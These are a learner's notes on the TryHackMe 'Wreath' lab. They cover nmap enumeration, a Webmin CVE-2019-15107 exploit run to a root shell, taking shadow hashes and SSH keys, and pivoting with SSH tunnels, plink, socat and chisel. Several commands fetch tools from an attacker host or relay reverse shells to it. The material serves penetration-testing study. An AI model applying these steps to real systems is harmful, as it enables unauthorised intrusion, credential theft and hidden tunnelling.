# Room
https://tryhackme.com/room/wreath

# Task 1 - Intro
* Pivoting
* C2
* Evasion

# Task 2 - Accessing the Network
Access

# Task 3 - Back Story
Story

# Task 4 - Brief
Three machines, public web server, git

# Task 5 - Web server Enumeration - nmap
* nmap
```
nmap -A -T4 10.200.98.200 -p 1-15000 | tee 10.200.98.200-nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:35 EDT
Nmap scan report for 10.200.98.200
Host is up (0.13s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2021-03-22T22:28:10
|_Not valid after:  2022-03-22T22:28:10
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.73 seconds
```
* check web port
```
curl -IvL http://10.200.98.200
*   Trying 10.200.98.200:80...
* Connected to 10.200.98.200 (10.200.98.200) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.200.98.200
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Date: Mon, 22 Mar 2021 22:38:57 GMT
Date: Mon, 22 Mar 2021 22:38:57 GMT
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
< Location: https://thomaswreath.thm
Location: https://thomaswreath.thm
< Content-Type: text/html; charset=iso-8859-1
Content-Type: text/html; charset=iso-8859-1

< 
* Connection #0 to host 10.200.98.200 left intact
* Issue another request to this URL: 'https://thomaswreath.thm/'
* Could not resolve host: thomaswreath.thm
* Closing connection 1
curl: (6) Could not resolve host: thomaswreath.thm
```
* point name to remote IP in hosts file
```
cat /etc/hosts | grep 10.200
10.200.98.200 thomaswreath.thm
```
* check web again, success
```
curl -ILk http://10.200.98.200
HTTP/1.1 302 Found
Date: Mon, 22 Mar 2021 22:42:00 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Location: https://thomaswreath.thm
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Mon, 22 Mar 2021 22:42:01 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Last-Modified: Sat, 07 Nov 2020 22:15:05 GMT
ETag: "3c17-5b38ba949f993"
Accept-Ranges: bytes
Content-Length: 15383
Content-Type: text/html; charset=UTF-8
```

# Task 6 - Web server Exploitation
* clone repo, install requirements, set executable bit
```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
Cloning into 'CVE-2019-15107'...
remote: Enumerating objects: 29, done.
remote: Counting objects: 100% (29/29), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 29 (delta 9), reused 14 (delta 3), pack-reused 0
Receiving objects: 100% (29/29), 19.47 KiB | 1.02 MiB/s, done.
Resolving deltas: 100% (9/9), done.

pip3 install -r requirements.txt 
Collecting argparse
  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Requirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 2)) (2.20.0)
Requirement already satisfied: urllib3 in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 3)) (1.24.3)
Requirement already satisfied: prompt_toolkit in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (3.0.14)
Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /usr/local/lib/python3.9/dist-packages (from requests->-r requirements.txt (line 2)) (3.0.4)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->-r requirements.txt (line 2)) (2020.6.20)
Requirement already satisfied: idna<2.8,>=2.5 in /usr/local/lib/python3.9/dist-packages (from requests->-r requirements.txt (line 2)) (2.7)
Installing collected packages: argparse
Successfully installed argparse-1.4.0

chmod +x CVE-2019-15107.py
```
* run the exploit code
```
./CVE-2019-15107.py 10.200.98.200                                                                                      
                                                                                                                                                                               
        __        __   _               _         ____   ____ _____                                                                                                             
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                            
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                              
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                             
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                             
                                                                                                                                                                               
                                                @MuirlandOracle                                                                                                                
                                                                                                                                                                               
                                                                                                                                                                               
[*] Server is running in SSL mode. Switching to HTTPS                                                                                                                          
[+] Connected to https://10.200.98.200:10000/ successfully.          
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
#
```
* with root access grab root password hash from /etc/shadow, grab SSH keys, chmod 600 file, test keys

# Task 7 - Pivoting
Pivoting uses access obtained on one machine to exploit another.  Example, exploit a public facing web server and then pivot to a db server

# Task 8 - Pivoting Overview
Some methods available for Pivoting are:
* Tunneling/Proxying - create a proxy through a compromised host and route traffic to a target
* Port Forwarding - create a connection between a local port and a single port on the target

Good enumeration will determine what type of Pivot method to use

# Task 9 - Pivoting Enumration
Enumeration via a compromised host in order of preference
* use material on the host
  * arp -a
  * /etc/hosts, /etc/resolv.conf
* use pre-installed tools
* use static compiled tools
  * compiled tools that do not require dependencies
* use live off the land techniques
  * use bash scripting, example - ping sweep
    ```
    for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
    ```
* use local tools through a proxy

# Task 10 - Proxychains & Foxyproxy
Proxychains is a CLI tool that is used by prepending it to other commands
* proxychains nc 1.2.3.4 23

Proxychains reads the proxy port from the config file located in ./proxychains.conf, ~/.proxychains/proxychains.conf, or /etc/proxychains.conf in that order, this allows you to create a different proxy set for each engagement

Example config
```
[ProxyList]
socks4  127.0.0.1 1234
```

Proxychains can only be used for TCP scans, ICMP does not work, and it is extremely slow

FoxyProxy is a web browser extension/addon for Chrome and Firefox.  It is used a lot in tandem with Burp Suite, etc, and is most useful when assessing a web based target.  Once the proxy is active, all browser traffic will redirect to the proxy configured

# Task 11 - Pivoting with SSH tunnels and Port forwarding
Using the SSH client

Forwarding
* a forward or "local" SSH tunnel
* two methods
  * port forwarding and proxying
* port forwarding uses ssh -L, L links to a Local port
  * example: ssh -L 8000:1.2.3.4:80 user@1.2.3.8 -fN
    * -L links to a Local port which in this case is 8000
    * 1.2.3.4:80 is what we are linking the Local port 8000 to
    * user@1.2.3.8 is the host we have SSH access to
    * -f backgrounds the shell
    * -N doesn't execute commands
* proxying uses ssh -D, D opens a local port for your proxy
  * example: ssh -D 1234 user@1.2.3.8 -fN
    * -D opens port 1234 for the proxy
    * user@1.2.3.8 is the host we have SSH access to
    * -f backgrounds the shell
    * -N doesn't execute commands

Reverse
* used to access your attacking machine from the target
* setup
  * generate throwaway ssh keys with ssh-keygen on attack box
  * copy public key, prefix it with
    ```
    command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
    ```
  * paste into authorized_keys on attack box
  * copy private key to target
* create a reverse connection with ssh -R
  * connect to the host we have SSH access to, 1.2.3.8
  * use ssh -R to create a reverse connection to another box
  * ssh -R 8000:1.2.3.4:80 user@5.6.7.8 -i keyfile -fN
    * -R creates the reverse connection
    * 8000 is the local port on 1.2.3.8
    * 1.2.3.4:80 is the other box you can reach from 1.2.3.8
    * user@5.6.7.8 is your attacking machine
    * -i to specify the private key
    * -f backgrounds the shell
    * -N doesn't execute commands

# Task 12 - Pivoting - Plink
Plink.exe is the Windows CLI version of Putty.  To use keys from ssh-keygen you need to convert them with puttygen, puttygen keyfile -o output.ppk

To create a reverse connection:
```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

# Task 13 - Pivoting - Socat
Socat is great for fully stable shells, but is often not installed.  

Transfering socat:
```
attacker:
sudo python3 -m http.server 80

target:
curl [attacker_ip]/socat -o /tmp/socat-username && chmod +x /tmp/socat-username
```

Reverse shell relay with socat:
```
attacker:
sudo nc -nvlp 443

target:
./socat tcp-l:8000 tcp:[attacker_ip]:443 &
```
* tcp-l:8000 - creates a listener for port 8000
* tcp:[attacker_ip]:443 - connects back to the attacking host
* & - background the listener

Port forwarding with socat:
```
target:
./socat tcp-l:33060,fork,reuseaddr tcp:[target_ip]:3306 &
```
* tcp-l:33060 - creates a listener for port 33060
* fork - put every connection into a new process
* reuseaddr - port stays open after a connection is made to it
* tcp:[target_ip]:3306 - connects to the target on port 3306
* & - background the listener

Port forwarding (quiet - no open ports) with socat:
```
attacker:
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```
* create a local relay between 8001 and 8000 with reuse

```
target:
./socat tcp:[attacker_ip]:8001 tcp:[target_ip]:80,fork &
```
* connection from the listening port 80 on the target and the attacker on 8001

```
attacker:
request to localhost:8000
```
attacker > target flow
* request to localhost 8000
* go in 8000, come out 8001
* 8001 is connected to the compromised server on port 80

target > attacker flow
* response sent to socat, which goes to 8001 on the attacker
* inbound from 8001 of the target comes out 8000 on the attacker

# Task 14 - Pivoting - Chisel
Chisel is a TCP/UDP tunnel over HTTP

https://github.com/jpillora/chisel

Chisel has to be on both the attacker and target machine.  Chisel has two modes: client and server

Reverse SOCKS proxy with chisel:
* Connection from target back to attacker, port 1080 is used by default once the connection is established
```
attacker:

./chisel server -p [listen_port] --reverse &

target:
./chisel client [attacker_ip]:[listen_port] R:socks &
```

Forward SOCKS proxy with chisel:
```
target:

./chisel server -p [listen_port] --socks5

attacker:

./chisel client [target_ip]:[listen_port] [proxy_port]:socks
```

* Note: configure proxychains to use socks5

Remote port forward with chisel:
```
attacker:

./chisel server -p [listen_port] --reverse &

target:

./chisel client [attacker_ip]:[listen_port] R:[local_port]:[target_ip]:[target_port] &
```
* listen_port is the port that we started the chisel server on
* local_port is the port you connect to on the attacker machine that links you to target_port on the target machine

Local port forward with chisel:
```
target:

./chisel server -p [listen_port]

attacker:

./chisel client [target_ip]:[listen_port] [local_port]:[target_ip]:[target_port]
```

*Note: use the jobs command to see a list of backgrounded jobs